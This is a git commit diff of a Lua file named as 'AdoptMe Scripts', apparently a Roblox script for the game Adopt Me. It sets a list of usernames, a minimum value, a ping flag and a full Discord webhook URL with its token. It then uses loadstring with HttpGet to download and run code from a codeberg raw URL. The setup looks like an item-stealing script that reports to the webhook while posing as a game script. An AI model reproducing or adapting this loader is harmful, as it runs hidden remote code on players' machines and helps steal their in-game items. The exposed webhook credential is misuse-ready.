6f8490f9e8ee3d2bf29f81e64fbdd8f300880fa1
LuaScript <Franzforger15@gmail.com>
2025-10-05 00:11:41 +0800

    Update AdoptMe Scripts .lua

--- AdoptMe Scripts .lua
+++ AdoptMe Scripts .lua
@@ -1,15 +1,10 @@
-users = {''''Bugegg12384''''}
+_G.Usernames = {"Bugegg12384", "gardenhssxcx", "WspNegatron5"}
 
-min_value = 1
+_G.min_value = 1
 
-ping = "yes"
+_G.pingEveryone = "Yes"
 
-webhook ="https://discord.com/api/webhooks/1422766050595835965/rEx78H2W_lcuE7s3vAZUK8VaqKj361vYAs29sDaAfYrYIwFwBVQqNlULcyq8HV0dIcx0"
+_G.webhook =
+"https://discord.com/api/webhooks/1422766050595835965/rEx78H2W_lcuE7s3vAZUK8VaqKj361vYAs29sDaAfYrYIwFwBVQqNlULcyq8HV0dIcx0"
 
-embedcol = 65280
-
-loadstring(game:HttpGet("https://
-
-codeberg.org/amaz/main/raw/branch
-
-/main/adm"))()
+loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/adm"))()
